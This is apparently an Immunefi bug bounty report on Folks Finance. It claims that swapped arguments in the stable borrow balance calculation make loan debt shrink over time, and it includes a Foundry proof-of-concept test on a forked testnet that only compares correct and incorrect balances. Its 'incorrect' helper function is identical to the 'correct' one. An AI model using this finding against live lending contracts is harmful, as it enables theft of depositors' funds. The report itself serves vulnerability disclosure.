# Boost \_ Folks Finance 33630 - \[Smart Contract - High] Incorrect calculation of loanBorrowbalance

Submitted on Wed Jul 24 2024 21:31:16 GMT-0400 (Atlantic Standard Time) by @ethprotector for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33630

Report type: Smart Contract

Report severity: High

Target: <https://testnet.snowtrace.io/address/0xf8E94c5Da5f5F23b39399F6679b2eAb29FE3071e>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Vulnerability Details

`UserLoanLogic.calcStableBorrowBalance` is incorrect.

```
/// @dev Calculates the borrow balance of a loan at time T.
    /// @param borrowBalanceAtTn_1 The borrow balance of a loan at time Tn-1.
    /// @param borrowInterestIndexAtT 18dp - The borrow interest index of a pool at time T-1.
    /// @param borrowInterestIndexAtTn_1 18dp - The borrow interest index of a pool at time Tn-1.
    /// @return The borrow balance of a loan at time T.
    function calcBorrowBalance(
        uint256 borrowBalanceAtTn_1,
        uint256 borrowInterestIndexAtT,
        uint256 borrowInterestIndexAtTn_1
    ) internal pure returns (uint256) {
        return
            borrowBalanceAtTn_1.mulDiv(
                borrowInterestIndexAtT.mulDiv(ONE_18_DP, borrowInterestIndexAtTn_1, Math.Rounding.Ceil),
                ONE_18_DP,
                Math.Rounding.Ceil
            );
    }
```

In UserLoanLogic.calcStableBorrowBalance function, the second and third parameters were switched, when this function was called.

As a result, loanBorrow\.balance decreases over time instead of increasing.

## Impact Details

UserLoanLogic.getLoanLiquidity function uses the incorrect function and this function is used to check loan is over-collaterised after the borrow. And it is used to check for the possibility of liquidation.

#### Ultimately, users can repay less than the amount they borrowed and still withdraw all their collateral.

#### This also causes problems for liquidation.

## Proof of concept

## Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";
import "../../src/interfaces/IHubCircleTokenPool.sol";
import "../../src/interfaces/ISpokeCommon.sol";
import "../../src/interfaces/ISpokeCircleToken.sol";
import "../../src/interfaces/IHub.sol";
import "../../src/interfaces/ILoanManager.sol";
import "../../src/OracleManager.sol";
import "../../src/interfaces/IBridgeRouter.sol";
import "../../src/FlashloanContract.sol";
import "../../src/MathUtils.sol";

contract FolksFinance is PoC {
    using MathUtils for uint256;

    ISpokeCommon private _spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
    ISpokeCircleToken private _spokeCircleToken = ISpokeCircleToken(0x89df7db4af48Ec7A84DE09F755ade9AF1940420b);
    IHub private _hub = IHub(0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140);
    IHubCircleTokenPool private _hubCirclePool = IHubCircleTokenPool(0x1968237f3a7D256D08BcAb212D7ae28fEda72c34);
    IERC20 private constant usdcToken = IERC20(0x5425890298aed601595a70AB815c96711a31Bc65);
    IBridgeRouter private _bridgeRouter = IBridgeRouter(0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837);
    ILoanManager private _loanManager = ILoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);

    address private attacker = 0x9FA562675ea0d73519F125AC52Aed6C684f7f2d6;
    address private user = 0xaA868dACbA543AacE30d69177b7d44047c2Fe27A;
    address private admin = 0x16870a6A85cD152229B97d018194d66740f932d6;

    FlashloanContract private _flashloanContract;

    uint256 private _1USDC = 1e6;

    bytes32 private attackerAccountId = bytes32("attackerAccountId");
    bytes32 private attackerLoanId = bytes32("attackerLoanId");
    bytes32 private userAccountId = bytes32("userAccountId");
    bytes32 private userLoanId = bytes32("userLoanId");

    bytes32 private constant RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    bytes32 private refAccountId;
    uint8 private poolId = 128;

    Messages.MessageParams private _params;

    function setUp() virtual public {
        vm.createSelectFork("avalanche_fuji", 34899929);

        _flashloanContract = new FlashloanContract();


        // update pool config
        vm.startPrank(admin);

        IHubCircleTokenPool.ConfigData memory configData;
        configData.canMintFToken = true;
        configData.flashLoanSupported = true;
        configData.stableBorrowSupported = true;
        _hubCirclePool.updateConfigData(configData);

        OracleManager oracleManager = new OracleManager();
        _hubCirclePool.updateOracleManager(oracleManager);
        _loanManager.updateOracleManager(oracleManager);

        vm.stopPrank();

        _params = Messages.MessageParams({
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });
    }

    function testCalcStableBorrowBalance() public {
        vm.startPrank(user);

        _spokeCommon.createAccount(_params, userAccountId, refAccountId);
        _spokeCommon.createLoan(_params, userAccountId, userLoanId, 2, "userLoanId");

        uint256 depositAmount = 10_000_000 * _1USDC;
        uint256 borrowAmount = 4_000_000 * _1USDC;
        usdcToken.approve(address(_spokeCircleToken), type(uint256).max);
        _spokeCircleToken.deposit(_params, userAccountId, userLoanId, depositAmount);
        _spokeCommon.borrow(_params, userAccountId, userLoanId, poolId, 1, borrowAmount, 0);

        vm.stopPrank();

        vm.startPrank(attacker);


        _spokeCommon.createAccount(_params, attackerAccountId, refAccountId);
        _spokeCommon.createLoan(_params, attackerAccountId, attackerLoanId, 2, "attackerLoanId");

        depositAmount = 400_000 * _1USDC;
        borrowAmount = depositAmount * 8 / 10 - 1;
        usdcToken.approve(address(_spokeCircleToken), type(uint256).max);
        _spokeCircleToken.deposit(_params, attackerAccountId, attackerLoanId, depositAmount);
        _spokeCommon.borrow(_params, attackerAccountId, attackerLoanId, poolId, 1, borrowAmount, type(uint256).max);

        uint256 depositInterestIndex;
        uint256 borrowIndex;

        IHubCircleTokenPool.DepositData memory depositData = _hubCirclePool.getDepositData();
        ILoanManager.UserLoanBorrow[] memory borrows;
        ILoanManager.UserLoanCollateral[] memory collaterals;
        (,,,, collaterals, borrows) = _loanManager.getUserLoan(attackerLoanId);

        uint256 initBalance = borrows[0].balance;

        vm.warp(block.timestamp + 365 days);

        ILoanManager.UserLoanBorrow memory loanBorrow = borrows[0];

        uint256 incorrectBorrowBalance = calcStableBorrowBalance(
            loanBorrow.balance,
            loanBorrow.lastInterestIndex,
            loanBorrow.stableInterestRate,
            block.timestamp - loanBorrow.lastStableUpdateTimestamp
        );

        uint256 correctBorrowBalance = _getCorrectBorrowBalance(loanBorrow);

        console.log("borrowBalance            ", initBalance);
        console.log("correctBorrowBalance     ", correctBorrowBalance);
        console.log("incorrectBorrowBalance   ", incorrectBorrowBalance);

        // This means that users can deposit less funds than they have borrowed and still withdraw all of their collateral.

        vm.stopPrank();
    }

    function calcStableBorrowBalance(
        uint256 balance,
        uint256 loanInterestIndex,
        uint256 loanInterestRate,
        uint256 stableBorrowChangeDelta
    ) private pure returns (uint256) {
        uint256 stableBorrowInterestIndex = MathUtils.calcBorrowInterestIndex(
            loanInterestRate,
            loanInterestIndex,
            stableBorrowChangeDelta
        );
        // incorrect code
        return balance.calcBorrowBalance(loanInterestIndex, stableBorrowInterestIndex);
        // correct code
        // return balance.calcBorrowBalance(stableBorrowInterestIndex, loanInterestIndex);
    }



    function _getCorrectBorrowBalance(ILoanManager.UserLoanBorrow memory loanBorrow) public returns(uint256){
        uint256 oldInterestIndex = loanBorrow.lastInterestIndex;
        uint256 oldStableInterestRate = loanBorrow.stableInterestRate;
        loanBorrow.lastInterestIndex = MathUtils.calcBorrowInterestIndex(
            oldStableInterestRate,
            oldInterestIndex,
            block.timestamp - loanBorrow.lastStableUpdateTimestamp
        );
        loanBorrow.lastStableUpdateTimestamp = block.timestamp;

        // update balance with interest
        loanBorrow.balance = MathUtils.calcBorrowBalance(
            loanBorrow.balance,
            loanBorrow.lastInterestIndex,
            oldInterestIndex
        );
        return loanBorrow.balance;
    }

    function _getIncorrectBorrowBalance(ILoanManager.UserLoanBorrow memory loanBorrow) public returns(uint256){
        uint256 oldInterestIndex = loanBorrow.lastInterestIndex;
        uint256 oldStableInterestRate = loanBorrow.stableInterestRate;
        loanBorrow.lastInterestIndex = MathUtils.calcBorrowInterestIndex(
            oldStableInterestRate,
            oldInterestIndex,
            block.timestamp - loanBorrow.lastStableUpdateTimestamp
        );
        loanBorrow.lastStableUpdateTimestamp = block.timestamp;

        // update balance with interest
        loanBorrow.balance = MathUtils.calcBorrowBalance(
            loanBorrow.balance,
            loanBorrow.lastInterestIndex,
            oldInterestIndex
        );
        return loanBorrow.balance;
    }
}
```
